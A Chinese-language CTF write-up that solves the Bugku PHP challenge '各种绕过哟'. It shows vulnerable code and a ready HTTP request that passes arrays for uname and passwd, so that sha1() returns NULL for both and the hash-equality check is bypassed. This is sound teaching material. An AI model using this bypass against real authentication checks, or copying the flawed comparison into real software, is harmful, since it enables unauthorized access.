# Bugku CTF 各种绕过哟 WriteUp

---

## 题目分析

题目给出了一段PHP代码，核心逻辑如下：

```PHP

<?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd']) {
        print 'passwd can not be uname.';
    } else if (sha1($_GET['uname']) === sha1($_POST['passwd']) && ($_GET['id'] == 'margin')) {
        die('Flag: '.$flag);
    } else {
        print 'sorry!';
    }
}
?>
```

### 关键逻辑点

1. **参数要求**：需要同时存在GET参数`uname`和POST参数`passwd`。

2. **绕过第一个判断**：`$_GET['uname'] != $_POST['passwd']`，否则会被拦截。

3. **绕过第二个判断**：`sha1($_GET['uname']) === sha1($_POST['passwd'])`，同时`$_GET['id']`经过URL解码后等于`margin`。

---

## 漏洞原理

在PHP中，`sha1()`函数期望接收一个字符串作为参数。如果传入的是**数组**，函数会返回`NULL`。因此，我们可以构造`uname`和`passwd`为不同的数组，使得：

- `$_GET['uname'] != $_POST['passwd']`（数组内容不同，字符串比较不相等）

- `sha1($_GET['uname']) === sha1($_POST['passwd']) === NULL`（满足哈希相等的条件）

同时，`$_GET['id']`经过`urldecode`后需要等于`margin`，我们可以直接传`id=margin`，或者其URL编码形式`%6d%61%72%67%69%6e`。

---

## 解题步骤

1. **构造GET参数**：在URL中传入`uname[]=a`和`id=margin`。

    - 示例URL：`http://171.80.2.169:19378/?uname[]=a&id=margin`

2. **抓包修改请求**：使用Burp Suite拦截浏览器请求，将请求方法从`GET`改为`POST`，并添加POST参数`passwd[]=b`。

    - 也可以直接构造POST请求，在请求体中添加`passwd[]=b`。

3. **发送请求获取Flag**：修改后的请求会满足所有条件，服务器返回Flag。

### 示例HTTP请求

```HTTP

POST /?uname[]=a&id=margin HTTP/1.1
Host: 171.80.2.169:19378
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

passwd[]=b
```

---

## 结果

发送请求后，服务器返回flag。

---

## 总结

这道题考察了PHP中`sha1()`函数对数组的处理特性，以及GET/POST参数的构造技巧。通过利用数组绕过哈希比较，同时满足`id`参数的条件，即可成功获取flag。
> （注：文档部分内容可能由 AI 生成）